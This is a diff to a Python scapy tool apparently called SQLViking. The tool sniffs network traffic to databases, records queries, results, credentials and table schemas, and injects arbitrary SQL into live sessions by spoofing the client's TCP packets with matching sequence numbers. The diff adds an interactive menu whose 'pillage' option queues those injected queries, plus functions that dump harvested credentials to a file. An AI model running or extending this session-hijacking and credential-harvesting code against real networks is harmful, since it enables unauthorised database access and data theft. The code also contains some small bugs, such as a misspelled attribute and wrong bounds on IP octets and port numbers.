@@ -1,7 +1,7 @@
 from os import walk
 from operator import itemgetter
 from scapy.all import *
-import sys, getopt, re, argparse, threading, datetime
+import sys, getopt, re, argparse, threading, datetime, signal
 sys.path.append("databases/")
 from constantvalues import *
 #import constantvalues
@@ -29,10 +29,24 @@ class Conn():
         self.currentUser = ''
         self.currentInstance = ''
 
-    def setInstance(self,inst):
-        self.currentInstance = inst
-        if inst not in self.db.instances:
-            self.db.instances[inst] = []
+    def storeTraffic(self,data,pktType):
+        if pktType==RESPONSE and len(self.db.traffic) > 0 and self.db.traffic[-1].result == None: #is result
+            self.db.traffic[-1].result = data
+        elif pktType==RESPONSE: #is result, missed query
+            self.db.traffic.append(Traffic(result=data))
+        else: #is query
+            self.db.traffic.append(Traffic(query=data))
+
+    def setInstance(self,instName):
+        if instName not in self.db.instances:
+            self.db.instances[instName] = Instance(instName)
+        self.currentInstance = self.db.instances[instName]
+
+    def foundTable(self,tableName):
+        self.currentInstance.addTable(tableName)
+
+    def foundCol(self,tableName,colName):
+        self.db.currentInstance.addColumn(tableName,colName)
 
 class Database():
     def __init__(self,dbType,ip,port):
@@ -41,37 +55,71 @@ class Database():
         self.dbType      = dbType
         self.traffic     = []
         self.credentials = [] # username/hash pairs
-        self.instances   = {} # 'appnameDb' : [Table(), Table()]
+        self.instances   = {}
 
     def addUser(self,u):
         if u not in self.users:
             self.users.append(u)
 
-    def status(self):
-        return None
-
+    #god i'm dumb. this logic should be moved out of database class; should return json formatted data. main thread can format into whatever format desired.
     def getTraffic(self,mode):
-        if mode == HUMAN:
-            resp = '%s%s@%s:%s%s\n\n'%('-'*20,self.dbType,self.ip,self.port,'-'*20)
+        if mode.upper() == 'HUMAN':
+            resp = '\n%s%s@%s:%s%s\n\n'%('-'*20,self.dbType,self.ip,self.port,'-'*20)
             resp += 'Credentials:\n'
-            if len(self.credentials)>0:
+            if len(self.credentials) > 0:
                 for u,p in self.credentials:
                     resp += '\t%s : %s\n'%(u,p)
             else:
                 resp += 'No credentials harvested\n'
+
+            resp += '\nInstances:\n'
+            if len(self.instances) > 0:
+                for instanceName,instance in self.instances.iteritems():
+                    resp += '%s\n'%instanceName
+                    for tableName,table in instance.tables.iteritems():
+                        resp += '\t%s:\t%s\n'%(tableName, ', '.join(table.columns))
+            else:
+                resp += 'No instances identified\n' 
+
             resp += '\nTraffic:\n'
             for t in self.traffic:
                 resp += '\n--Timestamp--\n%s\n'%t.timestamp
                 resp += '--Request--\n'
-                for q in t.query:
-                    resp += '%s\n'%q
+                if t.query:
+                    for q in t.query:
+                        resp += '%s\n'%q
+                else:
+                    resp += 'None\n'
                 resp += '--Response--\n'
-                for r in t.result:
-                    resp += '%s\n'%r
+                if t.result:
+                    for r in t.result:
+                        resp += '%s\n'%r
+                else:
+                    resp += 'None\n'
             return resp
+        else:
+            return 'Format not yet implemented\n\n'
 
-    def addInstance(self,schema):
-        return
+class Instance():
+    def __init__(self,name,tables={}):
+        self.name = name
+        self.tables = {}
+
+    def addTable(self,tableName):
+        if tableName not in self.tables:
+            self.tables[tableName] = Table(tableName)
+
+    def addColumn(self,tableName,colName):
+        self.tables[tableName].addColumn(colName)
+
+class Table():
+    def __init__(self,name,cols=[]):
+        self.name = name
+        self.columns = cols
+
+    def addColumn(self,colName):
+        if colName not in self.columnss:
+            self.columns.append(colName)
 
 class Traffic():
     def __init__(self,query=None,result=None,instance=None):
@@ -79,11 +127,6 @@ class Traffic():
         self.result = result
         self.timestamp = datetime.datetime.now()
         self.instance = instance
-
-#store table specific info such as columns and associated attributes
-class Table():
-    def __init__(self,name,db):
-        return
 
 class Scout(threading.Thread):
     def __init__(self,interface="eth0"):
@@ -121,9 +164,27 @@ class Parse(threading.Thread):
         self.interface = interface
         self.debug = debug
 
+    def getNumQueries(self):
+        l = 0
+        for db in self.knownDatabases:
+            l += len(db.traffic)
+        return l
+
+    def getNumConns(self):
+        return len(self.knownConns)
+
+    def getNumDBs(self):
+        return len(self.knownDatabases)
+
     def dprint(self,s):
         if self.debug == 'True':
             print(s)
+
+    def dumpResults(self,format):
+        data = ''
+        for db in self.knownDatabases:
+            data += db.getTraffic(format)
+        return data
 
     def run(self):
         global dbQueue1,injectionQueue,pktQueue
@@ -134,26 +195,22 @@ class Parse(threading.Thread):
                 self.toInject.append(injectionQueue.get())
             if not pktQueue.empty():
                 self.handle(pktQueue.get())
-        for db in self.knownDatabases:
-            print db.getTraffic(HUMAN)
+        #for db in self.knownDatabases:
+        #    print db.getTraffic(HUMAN)
 
     def getConn(self,pkt):
         for c in self.knownConns:
             if pkt[IP].src  == c.cip and pkt[IP].dst == c.sip and pkt[TCP].sport == c.cport and pkt[TCP].dport == c.sport: #is req
-                #self.dprint('[?] pkt is req of known conn')
                 return c
             elif pkt[IP].src == c.sip and pkt[IP].dst == c.cip and pkt[TCP].sport == c.sport and pkt[TCP].dport == c.cport: #is resp
-                # self.dprint('[?] pkt is resp of known conn')
                 return c
 
         for db in self.knownDatabases:
             if pkt[IP].src == db.ip and pkt[TCP].sport == db.port: #new resp
-                #self.dprint('[?] pkt is resp; creating new conn')
                 c = Conn(cip=pkt[IP].dst,cport=pkt[TCP].dport,sip=db.ip,sport=db.port,state=None,db=db)
                 self.knownConns.append(c) 
                 return c
             elif pkt[IP].dst == db.ip and pkt[TCP].dport == db.port: #new req
-                #self.dprint('[?] pkt is req; creating new conn')
                 c = Conn(cip=pkt[IP].src,cport=pkt[TCP].sport,sip=db.ip,sport=db.port,state=None,db=db)
                 self.knownConns.append(c) 
                 return c
@@ -167,20 +224,11 @@ class Parse(threading.Thread):
             payload += str(p[TCP].payload)
 
         if conn.frag[0][IP].src == conn.sip and conn.frag[0][TCP].sport == conn.sport: #is response
-            self.store(DATABASELIST[conn.db.dbType].parseResp(payload,conn),RESPONSE,conn)
+            conn.storeTraffic(DATABASELIST[conn.db.dbType].parseResp(payload,conn),RESPONSE)
         else: #is request
-            self.store(DATABASELIST[conn.db.dbType].parseReq(payload,conn),REQUEST,conn)
+            conn.storeTraffic(DATABASELIST[conn.db.dbType].parseReq(payload,conn),REQUEST)
 
         conn.frag = []
-
-    #TODO: revamp this to leverage error handling methods for adding traffc instead of appending to array
-    def store(self,data,pktType,conn):
-        if pktType==RESPONSE and len(conn.db.traffic) > 0 and conn.db.traffic[-1].result == None: #is result
-            conn.db.traffic[-1].result = data
-        elif pktType==RESPONSE: #is result, missed query
-            conn.db.traffic.append(Traffic(result=data))
-        else: #is query
-            conn.db.traffic.append(Traffic(query=data))
 
     def handle(self,pkt):
         #even with TCP filter set on scapy, will occassionally get packets
@@ -190,7 +238,7 @@ class Parse(threading.Thread):
             pkt[TCP]
         except:
             return
-        
+
         c  = self.getConn(pkt)
         if c is None:
             return
@@ -199,11 +247,11 @@ class Parse(threading.Thread):
             for i in self.toInject: 
                 #self.printLn("[1] %s %s %s %s %s %s"%(c.db.ip,i[1],c.db.port,i[2],pkt[TCP].sport,pkt[TCP].flags))
                 if c.db.ip == i[1] and c.db.port == i[2] and pkt[TCP].sport == i[2]: #make sure to inject after db response to increase likelihood of success
-                    self.printLn("[2] attempting injection")
+                    #self.printLn("[2] attempting injection")
                     #self.printLn(databaseList[c.db.dbType].encodeQuery(i[0]).encode('hex'))
                     #sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
                     sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/DATABASELIST[c.db.dbType].encodeQuery(i[0]),iface=self.interface)
-                    self.nject.remove(i)
+                    self.toInject.remove(i)
 
         #check for control packets
         if pkt[TCP].flags == 17: #FIN/ACK pkt
@@ -218,24 +266,12 @@ class Parse(threading.Thread):
         if len(pkt[TCP].payload) == 0 or (len(pkt[TCP].payload) <= 16 and str(pkt[TCP].payload).encode('hex') == '00'*len(pkt[TCP].payload)): 
             return
         
-        # this destroys any kind of out-of-order fault tolerance. 
+        # this destroys any kind of out-of-order fault tolerance. need to rethink.
         #if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport and c.nextcseq != -1 and c.nextcseq != pkt[TCP].seq: #is a bad req
         #    return
         #elif pkt[IP].dst == c.cip and pkt[TCP].dport == c.cport and c.nextsseq != -1 and c.nextsseq != pkt[TCP].seq: #is a bad resp
         #    return
 
-        """if (pkt[TCP].flags >> 3) % 2 == 0: #PSH flag not set, is a fragged pkt. this breaks on data sent over lo interface. scapy does not seem to handle len(pkt)>MTU well. 
-            c.frag.append(pkt)
-        else:
-            if len(c.frag) > 0:
-                for p in c.frag:
-                    pkts.append(p)
-                c.frag = []
-            pkts.append(pkt)
-            if c.db != UNKNOWN:
-                self.parse(pkts,c)"""
-
-        #this is much cleaner than the method above. can probably still be cleaned up more. does parse need the conn obj?
         c.frag.append(pkt)
         if (pkt[TCP].flags >> 3) % 2 == 0:
             return
@@ -281,11 +317,130 @@ def parseConfig(f):
             elif flag == INJECTION:
                 injectionQueue.put(l)
             elif flag == DATA:
-                l = l #do nothing for know, leave check so i remember to update later when stuff is actually implemented
+                settings[l.split('=')[0].strip()] = l.split('=')[1].strip()
             elif flag == MISC:
                 settings[l.split('=')[0].strip()] = l.split('=')[1].strip()
 
     return settings
+
+def isValidIP(ip):
+    if len(ip.split('.')) != 4:
+        return False
+    for oct in ip.split('.'):
+        try:
+            if int(oct) < 0 or int(oct) > 256:
+                return False
+        except ValueError:
+            return False
+    return True
+
+def isValidPort(port):
+    try:
+        if int(port) < 0 or int(port) > 65565:
+            return False
+    except ValueError:
+        return False
+    return True
+
+def isValidDbType(dbType):
+    if dbType in DATABASELIST:
+        return True
+    else:
+        return False
+
+def writeResults(t):
+    global settings
+    print('[*] Enter filepath to write to:')
+    path = raw_input("> ")
+    data = t.dumpResults(settings['format'])
+    with open(path,'w') as f:
+        f.write(data)
+
+def addDb(t):
+    ip = ''
+    port = ''
+    dbtype = ''
+
+    while(not isValidIP(ip)):
+        print('[*] Enter IP of DB')
+        ip = raw_input('> ')
+    while(not isValidPort(port)):
+        print('[*] Enter port of DB')
+        port = raw_input('> ')
+    while(not isValidDbType(dbtype)):
+        print('[*] Enter type of DB')
+        dbtype = raw_input('> ').upper()
+
+    dbQueue1.put(Database(ip=ip,port=port,dbType=dbtype))
+
+def pillage():
+    global queries
+    print('[*] Enter query to execute:')
+    query = raw_input("> ")
+    print('[*] Enter IP to execute against:')
+    ip = raw_input("> ")
+    print('[*] Enter port to execute against:')
+    port = raw_input("> ")
+    print('[*] Run "%s" against %s:%s? [y/n]'%(query,ip,port))
+    ans = raw_input("> ")
+    if ans == 'y' or ans == 'Y':
+        injectionQueue.put([query,ip,int(port)])
+        print('[*] Query will run as soon as possible')
+    else:
+        print('[*] Cancelling...')
+    time.sleep(3)
+
+def parseInput(input,t):
+    if input == 'w':
+        writeResults(t)
+    elif input == 'r':
+        pillage()
+    elif input == 'a':
+        addDb(t)
+    elif input == 'q':
+        raise KeyboardInterrupt
+    else:
+        print('Unknown command entered')
+
+def wipeScreen():
+    y,x = os.popen('stty size', 'r').read().split()
+    print('\033[1;1H')
+    for i in range(0,int(y)):
+        print(' '*int(x))
+    print('\033[1;1H')
+
+class AlarmException(Exception):
+    pass
+
+def alarmHandler(signum, frame):
+    raise AlarmException
+
+def nonBlockingRawInput(t, prompt='> ', timeout=5):
+    signal.signal(signal.SIGALRM, alarmHandler)
+    signal.alarm(timeout)
+    try:
+        text = raw_input(prompt)
+        signal.alarm(0)
+        parseInput(text,t)
+    except AlarmException:
+        printMainMenu(t)
+    signal.signal(signal.SIGALRM,signal.SIG_IGN)
+    return ''
+
+def printMainMenu(t,wipe=True):
+    if wipe:
+        wipeScreen()
+        y,x = os.popen('stty size', 'r').read().split()
+
+    print('{{:^{}}}'.format(x).format('===Welcome to SQLViking==='))
+    print('\n[*] Current number of known DBs:\t\t%s'%t.getNumDBs())
+    print('[*] Current number of known connections:\t%s'%t.getNumConns())
+    print('[*] Current number of queries capured:\t\t%s'%t.getNumQueries())
+    print('\n[*] Menu Items:')
+    print('\tw - dump current results to file specified')
+    print('\ta - add new DB to track')
+    print('\tr - run a query against a specified DB')
+    print('\tq - quit')
 
 def main():
     global settings
@@ -307,10 +462,13 @@ def main():
     t2.start()
 
     #printMainMenu(t2)
+    #while True:
+    #    nonBlockingRawInput(t2)
+
     try:
+        printMainMenu(t2)
         while True:
-            a = 1
-        #nonBlockingRawInput(t2)
+            nonBlockingRawInput(t2)
     except KeyboardInterrupt:
         print('\n[!] Shutting down...')
         t1.die = True
@@ -318,7 +476,9 @@ def main():
     except:
         t1.die = True
         t2.die = True
-        print sys.exc_info()[1]
+        #print sys.exc_info()[1]
+        for e in sys.exc_info():
+            print e
 
 if __name__ == "__main__":
     main()
